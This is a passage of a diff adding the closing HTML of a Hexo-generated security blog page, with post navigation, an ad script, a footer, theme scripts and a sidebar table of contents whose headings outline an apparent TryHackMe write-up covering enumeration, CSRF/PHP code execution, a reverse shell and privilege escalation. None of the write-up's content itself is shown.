+            
+              <a href="/THM-Investigating-Windows/" rel="next" title="THM: Investigating Windows">
+                <i class="fa fa-chevron-left"></i> THM: Investigating Windows
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/THM-Startup/" rel="prev" title="THM: Startup">
+                THM: Startup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">112</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">98</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1012</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-4522670236044605"
+     data-ad-slot="5358884258"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Introduction"><span class="nav-number">1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nmap"><span class="nav-number">2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Server"><span class="nav-number">2.2.</span> <span class="nav-text">Web Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dirb"><span class="nav-number">2.3.</span> <span class="nav-text">Dirb</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Backup-Disclosure"><span class="nav-number">3.1.</span> <span class="nav-text">Backup Disclosure</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cross-Site-Request-Forgery-PHP-Code-Execution"><span class="nav-number">3.2.</span> <span class="nav-text">Cross-Site Request Forgery &#x2F; PHP Code Execution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-Shell-User-Flag"><span class="nav-number">3.2.1.</span> <span class="nav-text">Reverse Shell - User Flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-Root-Flag"><span class="nav-number">3.2.2.</span> <span class="nav-text">Privilege Escalation - Root Flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">4.</span> <span class="nav-text">Conclusion</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Laird Lau</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
